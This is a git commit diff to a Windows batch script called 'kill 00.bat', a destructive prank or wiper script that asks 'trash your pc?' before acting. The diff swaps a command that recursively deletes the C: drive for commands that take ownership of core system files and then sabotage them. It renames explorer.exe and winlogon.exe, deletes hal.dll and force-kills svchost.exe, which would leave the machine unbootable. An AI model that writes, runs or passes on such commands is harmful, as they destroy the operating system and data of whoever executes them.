73c5c18c1e92e17c5f3c98ebac8586e6049e440f
WINDOWS10X64BITS <bentitachaimae@gmail.com>
2025-05-02 18:42:34 +0200

    Update kill 00.bat

--- kill 00.bat
+++ kill 00.bat
@@ -2,6 +2,10 @@
 echo trash your pc?
 pause
 cd C:\windows\system32
-rd C:\ /s /q
-echo your pc is dead 
-pause
+takeown /f C:\windows\explorer.exe
+ren C:\windows\explorer.exe fishmyass.old
+takeown /f  C:\windows\system32\hal.dll
+del  C:\windows\system32\hal.dll /q
+takeown /f C:\windows\system32\winlogon.exe
+ren  C:\windows\system32\winlogon.exe windead.dead
+taskkill /f /im svchost.exe
